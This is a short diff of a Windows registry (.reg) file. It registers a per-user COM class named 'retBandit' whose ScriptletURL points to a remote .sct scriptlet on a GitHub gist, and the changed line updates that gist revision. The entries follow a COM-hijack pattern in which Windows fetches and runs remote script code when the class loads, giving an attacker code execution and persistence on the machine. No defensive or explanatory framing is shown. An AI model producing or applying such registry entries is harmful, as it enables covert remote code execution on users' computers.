@@ -16,7 +16,7 @@ Windows Registry Editor Version 5.00
 [HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000STARTATP}\ProgID]
 @="retBandit.1.00"
 [HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000STARTATP}\ScriptletURL]
-@="https://gist.githubusercontent.com/retbandit/16e6e1b5309f8d73e4c9a0dc1a103885/raw/dcb1fa7defa05f80029a9de9f9bd67e20852809a/startatp.sct"
+@="https://gist.githubusercontent.com/retbandit/16e6e1b5309f8d73e4c9a0dc1a103885/raw/52d1e3c58b2a3daf9a96f1cce4e246ed17691f44/startatp.sct"
 [HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000STARTATP}\VersionIndependentProgID]
 @="retBandit"
 [HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{E7D35CFA-348B-485E-B524-252725D697CA}]
